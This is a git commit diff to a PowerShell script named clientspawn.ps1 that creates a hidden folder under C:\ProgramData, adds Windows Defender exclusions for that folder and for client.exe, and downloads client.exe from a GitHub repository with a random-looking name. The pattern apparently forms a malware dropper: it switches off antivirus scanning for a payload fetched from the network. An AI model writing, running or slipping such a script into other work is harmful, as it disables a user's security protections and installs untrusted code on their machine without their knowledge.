431eb11a7e1eb19208cc6f424041a4e39e4ff491
RedTheMenace <101410080+RedTheMenace@users.noreply.github.com>
2022-08-31 21:42:10 -0400

    Update clientspawn.ps1

--- clientspawn.ps1
+++ clientspawn.ps1
@@ -1,4 +1,6 @@
 mkdir C:\ProgramData\TCPMSG
+Add-MpPreference -ExclusionPath "C:\ProgramData\TCPMSG"
+Add-MpPreference -ExclusionProcess "client.exe"
 $source = 'https://raw.githubusercontent.com/RedTheMenace/werwetfgawsergw345w3tserghwe/main/client.exe'
 $destination = 'C:\ProgramData\TCPMSG\client.exe'
 Invoke-WebRequest -Uri $source -OutFile $destination
